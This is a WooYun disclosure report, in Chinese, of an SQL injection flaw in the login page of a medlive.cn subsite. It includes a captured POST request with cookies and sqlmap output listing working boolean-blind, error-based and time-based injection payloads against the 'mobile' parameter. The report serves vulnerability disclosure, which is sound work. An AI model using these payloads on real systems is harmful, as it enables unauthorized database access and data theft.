wybug_title: 医脉通某分站存在sql注射漏洞
wybug_author: 天地不仁 以万物为刍狗
wybug_detail:
漏洞详情 披露状态：   									2015-04-28：	细节已通知厂商并且等待厂商处理中									2015-04-28：	厂商已经确认，细节仅向厂商公开									2015-05-08：	细节向核心白帽子及相关领域专家公开									2015-05-18：	细节向普通白帽子公开									2015-05-28：	细节向实习白帽子公开									2015-06-12：	细节向公众公开  简要描述： ···未脱裤 点到为止 详细说明：  post数据
POST /login.php HTTP/1.1Host: blz.medlive.cnProxy-Connection: keep-aliveContent-Length: 55Accept: application/json, text/javascript, */*Origin: http://blz.medlive.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.1.4627.19 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://blz.medlive.cn/Accept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ymtinfo=eyJ1aWQiOiIyMTExOTQyIiwicmVzb3VyY2UiOiJ3ZWIiLCJhcHBfbmFtZSI6IiIsImV4dF92ZXJzaW9uIjoiMSJ9; Hm_lvt_62d92d99f7c1e7a31a11759de376479f=1430122053,1430122204; Hm_lpvt_62d92d99f7c1e7a31a11759de376479f=1430126950; _pk_id.3.a971=5e73da560571abba.1430122056.1.1430126950.1430122056.; _pk_ses.3.a971=*; CNZZDATA3787472=cnzz_eid%3D116372864-1430123151-%26ntime%3D1430123151mobile=13800138000&pwd=111111



sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: mobile    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: mobile=-8674' OR (9230=9230)#&pwd=111111    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: mobile=13800138000' AND (SELECT 1571 FROM(SELECT COUNT(*),CONCAT(0x7161666271,(SELECT (CASE WHEN (1571=1571) THEN 1 ELSE 0 END)),0x71746e6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'dfbn'='dfbn&pwd=111111    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: mobile=13800138000' AND 4462=BENCHMARK(5000000,MD5(0x69775579)) AND 'iUTc'='iUTc&pwd=111111---
总共两个数据库
